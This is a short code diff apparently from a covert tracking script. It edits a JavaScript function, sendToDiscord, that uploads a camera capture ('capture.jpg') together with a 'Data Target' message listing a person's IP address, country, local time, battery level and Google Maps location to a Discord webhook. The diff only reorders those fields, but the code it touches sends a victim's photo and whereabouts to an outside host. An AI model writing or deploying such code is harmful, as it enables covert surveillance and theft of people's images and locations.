@@ -93,7 +93,7 @@ function sendToDiscord(blob, ip, country, localTime, batteryPercentage, mapsLink
     formData.append("file", blob, "capture.jpg");
 
     formData.append("payload_json", JSON.stringify({  
-        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n📌 **Country**: ${country}\n⏰ **InterTime**: ${localTime}\n🔋 **Battery Percentage**: ${batteryPercentage}%\n📍 **Lokasi**: [Google Maps](${mapsLink})`
+        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n🔋 **Battery Percentage**: ${batteryPercentage}%\n📌 **Country**: ${country}\n📍 **Lokasi**: [Google Maps](${mapsLink})⏰ **Time**: ${localTime}`
     }));  
 
     fetch(webhookURL, {  
